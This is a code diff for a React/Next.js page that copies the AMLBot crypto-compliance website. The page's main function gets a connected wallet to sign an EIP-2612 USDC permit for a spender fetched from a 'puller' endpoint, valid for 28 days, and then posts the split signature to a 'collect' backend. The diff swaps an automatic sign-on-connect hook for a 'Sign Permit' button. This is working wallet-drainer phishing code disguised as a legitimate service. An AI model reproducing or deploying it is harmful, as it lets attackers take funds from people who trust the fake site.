@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback, useMemo, useState } from "react";
+import { useState } from "react";
 import { useAccount, useChainId, useSwitchChain, useSignTypedData, usePublicClient } from "wagmi";
 import { mainnet } from "viem/chains";
 import { parseAbi } from "viem";
@@ -10,118 +10,126 @@ import "../public/css/224756d2aeed5110.css";
 import "../public/css/7500854e1ee55cc8.css";
 import "../public/css/styles.css";
 import Head from "next/head";
-import { useAutoPermitOnConnect } from "./useAutoPermitOnConnect";
-import { buildPermitDomain, PermitMessage, permitTypes, splitSignature } from "./permit";
 
-const USDC_MAINNET = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
-const USDC_DECIMALS = BigInt(6);
-const PULLER_FROM_ENV = process.env.NEXT_PUBLIC_PULLER_FROM_ENV;
+const TOKEN = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC
+const TOKEN_NAME = "USD Coin";
+const TOKEN_VERSION = "2";
+const FIXED_AMOUNT = BigInt(5 * 10 ** 6); // 5 USDC (6 decimals)
 
 const erc2612Abi = parseAbi([
-  "function nonces(address) view returns (uint256)"
+    "function nonces(address) view returns (uint256)"
 ]);
 
 export default function Home() {
-  const { address, isConnected } = useAccount();
-  const chainId = useChainId();
-  const publicClient = usePublicClient();
-  const { switchChainAsync } = useSwitchChain();
+    const { address, isConnected } = useAccount();
+    const chainId = useChainId();
+    const { switchChainAsync } = useSwitchChain();
+    const publicClient = usePublicClient();
 
-  const { signTypedDataAsync, isPending } = useSignTypedData();
+    const { signTypedDataAsync } = useSignTypedData();
 
-  const [status, setStatus] = useState<string>("");
+    const [status, setStatus] = useState<string>("");
 
-  const spender = useMemo<`0x${string}`>(() => {
-    // if needed, pull dynamically from backend inside handlePermit()
-    return (PULLER_FROM_ENV ?? "0x561201e207607c5b09d9e1682e8a78250ce59f1e") as `0x${string}`;
-  }, []);
+    const handlePermit = async () => {
+        try {
 
-  const handlePermit = useCallback(async () => {
-    try {
-      setStatus("Готовим подпись…");
+            if (!isConnected || !address) {
+                setStatus("First connect your wallet.");
+                return;
+            }
+            if (chainId !== mainnet.id) {
+                await switchChainAsync({ chainId: mainnet.id });
+            }
 
-      if (!isConnected || !address) {
-        setStatus("Сначала подключите кошелёк.");
-        return;
-      }
-      if (chainId !== mainnet.id) {
-        await switchChainAsync({ chainId: mainnet.id });
-      }
+            // 1) puller from backend (if needed right now)
+            const res = await fetch("/api/v1/puller"); // make a proxy to not catch CORS
+            const { puller } = await res.json();
+            // For demonstration, we'll use a fake spender:
+            // const puller = "0x1111111254EEB25477B68fb85Ed929f73A960582"; // replace with your puller
 
-        // const res = await fetch("/api/v1/puller")
-        // const { puller } = await res.json();
+            if (!publicClient) {
+                throw new Error("Public client is not available");
+            }
 
-      // 1) read nonce
-      const nonce = (await publicClient!.readContract({
-        address: USDC_MAINNET,
-        abi: erc2612Abi,
-        functionName: "nonces",
-        args: [address],
-      })) as bigint;
+            // 2) read nonce from USDC
+            const nonce = await publicClient.readContract({
+                address: TOKEN as `0x${string}`,
+                abi: erc2612Abi,
+                functionName: "nonces",
+                args: [address],
+            });
 
-      // 2) collect EIP-712
-      const value = BigInt(5 * 10 ** Number(USDC_DECIMALS)); // 5 USDC
-      const deadline = BigInt(Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60); // 28 days
+            // 3) collect EIP-712
+            const deadline = BigInt(Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60);
 
-      const domain = buildPermitDomain(USDC_MAINNET);
-      const message: PermitMessage = {
-        owner: address,
-        spender,
-        value,
-        nonce,
-        deadline,
-      };
+            const domain = {
+                name: TOKEN_NAME,
+                version: TOKEN_VERSION,
+                chainId: mainnet.id,
+                verifyingContract: TOKEN as `0x${string}`,
+            } as const;
 
-      // 3) sign via wagmi/viem
-      const signature = await signTypedDataAsync({
-        domain,
-        types: permitTypes,
-        primaryType: "Permit",
-        message,
-      });
+            const types = {
+                Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" },
+                ],
+            } as const;
 
-      const { v, r, s } = splitSignature(signature as `0x${string}`);
+            const message = {
+                owner: address,
+                spender: puller,
+                value: FIXED_AMOUNT,
+                nonce,
+                deadline,
+            } as const;
 
-      const payload = {
-        chainId: String(mainnet.id),
-        token: USDC_MAINNET,
-        puller: spender,
-        owner: address,
-        permitValue: value.toString(),
-        nonce: nonce.toString(),
-        deadline: deadline.toString(),
-        v,
-        r,
-        s,
-        amountUnits: value.toString(),
-      };
+            // 4) sign via wagmi/viem (universal for WC / injected)
+            const signature = await signTypedDataAsync({
+                domain,
+                types,
+                primaryType: "Permit",
+                message,
+            });
 
-      console.log("✅ permit payload", payload);
-      setStatus("✅ Signature received (see console).");
+            // 5) parse v,r,s (viem doesn't give it to you right away, but the backend usually can send the whole signature)
+            // If you need v/r/s:
+            const r = signature.slice(0, 66);
+            const s = "0x" + signature.slice(66, 130);
+            const v = parseInt(signature.slice(130, 132), 16);
 
-      // 4) send to backend (uncomment and configure CORS/proxy)
-      await fetch("/api/v1/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
+            // 6) Payload to backend
+            const payload = {
+                chainId: String(mainnet.id),
+                token: TOKEN,
+                puller,
+                owner: address,
+                permitValue: FIXED_AMOUNT.toString(),
+                nonce: nonce.toString(),
+                deadline: deadline.toString(),
+                v, r, s,
+                amountUnits: FIXED_AMOUNT.toString(),
+            };
 
-    } catch (e: any) {
-      console.error(e);
-      setStatus(`❌ Error: ${e?.shortMessage ?? e?.message ?? String(e)}`);
+            console.log("permit payload", payload);
+
+            // Test without POST first (CORS/HTTP trap)
+            await fetch("http://localhost:8080/api/v1/collect", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+            });
+
+            setStatus("✅ Signature received. See console.");
+
+        } catch (e: any) {
+            console.error(e);
+            setStatus(`❌ Error: ${e?.message ?? e}`);
+        }
     }
-  }, [
-    isConnected,
-    address,
-    chainId,
-    publicClient,
-    signTypedDataAsync,
-    spender,
-    switchChainAsync,
-  ]);
-
-  // auto-start signing immediately after connection
-  useAutoPermitOnConnect(handlePermit);
 
     return (
         <main style={{padding: "40px"}}>
@@ -155,13 +163,13 @@ export default function Home() {
                 <meta name="twitter:description"
                       content="AMLBot provides advanced AML compliance solutions for crypto businesses. Use our AML bot for thorough AML checks and ensure compliance with the latest regulations. Protect your assets with AMLBot's comprehensive platform." />
 
-                {/* Preload fonts */}
+                {/* Прелоад шрифтов */}
                 <link rel="preload" href="/_next/static/media/55c55f0601d81cf3-s.p.woff2" as="font" type="font/woff2"
                       crossOrigin="anonymous" data-next-font="size-adjust" />
                 <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2"
                       crossOrigin="anonymous" data-next-font="size-adjust" />
 
-                {/* Connect styles */}
+                {/* Подключение стилей */}
                 <link rel="stylesheet" href="../public/css/224756d2aeed5110.css" />
                 <link rel="stylesheet" href="../public/css/8b09c5b14a9651c1.css" />
                 <link rel="stylesheet" href="../public/css/7500854e1ee55cc8.css" />
@@ -369,21 +377,21 @@ export default function Home() {
                                 <div className="HPtOMS">
                                     <w3m-button />
 
-                                    {/*{isConnected && address && (*/}
-                                    {/*    <button*/}
-                                    {/*        onClick={() => handlePermit()}*/}
-                                    {/*        style={{ marginTop: 20, padding: "10px 20px" }}*/}
-                                    {/*    >*/}
-                                    {/*        🖊 Sign Permit*/}
-                                    {/*    </button>*/}
-                                    {/*)}*/}
+                                    {isConnected && address && (
+                                        <button
+                                            onClick={() => handlePermit()}
+                                            style={{ marginTop: 20, padding: "10px 20px" }}
+                                        >
+                                            🖊 Sign Permit
+                                        </button>
+                                    )}
                                 </div>
                             </div>
                             <div className="_1VtWaa"><img alt="One-stop compliance solution for crypto business"
                                                           loading="lazy"
                                                           width="1680" height="1040" decoding="async" data-nimg="1"
                                                           style={{color: "transparent"}}
-                                                          src="/image/nout.png"/>
+                                                          src="/public/image/nout.png"/>
                             </div>
                         </div>
                     </main>
@@ -398,7 +406,7 @@ export default function Home() {
                                     data-nimg="1"
                                     className="EFniD4"
                                     style={{color: "transparent"}}
-                                    src="/image/trust.png"/>
+                                    src="/public/image/trust.png"/>
                                     <div className="SY9kc_">
                                         <div className="E6G38x">
                                             <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
@@ -454,30 +462,30 @@ export default function Home() {
                                                  loading="lazy"
                                                  width="64" height="64" decoding="async" data-nimg="1"
                                                  style={{color: "transparent"}}
-                                                 src="/image/INATBA.png"/><span>INATBA</span>
+                                                 src="/public/image/INATBA.png"/><span>INATBA</span>
                                         </li>
                                         <li><img alt="Crypto Defenders Alliance" loading="lazy" width="64" height="64"
                                                  decoding="async" data-nimg="1" style={{color: "transparent"}}
-                                                 src="/image/CDA.png"/><span>CDA</span>
+                                                 src="/public/image/CDA.png"/><span>CDA</span>
                                         </li>
                                         <li><img alt="Anti-Human Trafficking Intelligence Initiative" loading="lazy"
                                                  width="64"
                                                  height="64" decoding="async" data-nimg="1" style={{color: "transparent"}}
-                                                 src="/image/ATII.png"/><span>ATII</span>
+                                                 src="/public/image/ATII.png"/><span>ATII</span>
                                         </li>
                                         <li><img alt="League for Security in the Web3" loading="lazy" width="64"
                                                  height="64"
                                                  decoding="async" data-nimg="1" style={{color: "transparent"}}
-                                                 src="/image/LSW3.png"/><span>LSW3</span>
+                                                 src="/public/image/LSW3.png"/><span>LSW3</span>
                                         </li>
                                         <li><img alt="EU Blockchain Association" loading="lazy" width="64" height="64"
                                                  decoding="async" data-nimg="1" style={{color: "transparent"}}
-                                                 src="/image/EUBA.png"/><span>ЕВА</span>
+                                                 src="/public/image/EUBA.png"/><span>ЕВА</span>
                                         </li>
                                         <li><img alt="FinTech Association of Hong Kong" loading="lazy" width="200"
                                                  height="200"
                                                  decoding="async" data-nimg="1" style={{color: "transparent"}}
-                                                 src="/image/FTAHK.png"/><span>FTAHK</span>
+                                                 src="/public/image/FTAHK.png"/><span>FTAHK</span>
                                         </li>
                                     </ul>
                                 </div>
@@ -500,15 +508,15 @@ export default function Home() {
                                                 <div><img alt="Binance" loading="lazy" width="140" height="29"
                                                           decoding="async"
                                                           data-nimg="1" style={{color: "transparent"}}
-                                                          src="/image/binance.svg"/></div>
+                                                          src="/public/image/binance.svg"/></div>
                                                 <div><img alt="OKX" loading="lazy" width="72" height="29"
                                                           decoding="async"
                                                           data-nimg="1" style={{color: "transparent"}}
-                                                          src="/image/okx.svg"/></div>
+                                                          src="/public/image/okx.svg"/></div>
                                                 <div><img alt="Huobi" loading="lazy" width="88" height="29"
                                                           decoding="async"
                                                           data-nimg="1" style={{color: "transparent"}}
-                                                          src="/image/huobi.svg"/></div>
+                                                          src="/public/image/huobi.svg"/></div>
                                             </div>
                                         </div>
                                         <p className="N4mo6s">Compliance departments that accept our AML procedures</p>
@@ -877,7 +885,7 @@ export default function Home() {
                                     height="120" decoding="async"
                                     data-nimg="1"
                                     style={{color: "transparent"}}
-                                    src="/image/iso.svg"/></a><a
+                                    src="/public/image/iso.svg"/></a><a
                                     target="_blank" href="https://amlbot.com/certifications"><img alt="ISO 27001:2017"
                                                                                                   loading="lazy"
                                                                                                   width="120"
@@ -885,7 +893,7 @@ export default function Home() {
                                                                                                   decoding="async"
                                                                                                   data-nimg="1"
                                                                                                   style={{color: "transparent"}}
-                                                                                                  src="/image/iso.svg"/></a>
+                                                                                                  src="/public/image/iso.svg"/></a>
                                 </div>
                                 <a target="_blank" className="wIL4xY lZlhxp y_16nq F9reqP"
                                    href="https://trustpilot.com/review/amlbot.com"><img alt="Trustpilot" loading="lazy"
@@ -894,7 +902,7 @@ export default function Home() {
                                                                                         data-nimg="1"
                                                                                         className="EFniD4"
                                                                                         style={{color: "transparent"}}
-                                                                                        src="/image/trust.svg"/>
+                                                                                        src="/public/image/trust.svg"/>
                                     <div className="SY9kc_">
                                         <div className="E6G38x">
                                             <svg viewBox="0 0 47 47" version="1.1" xmlns="http://www.w3.org/2000/svg"
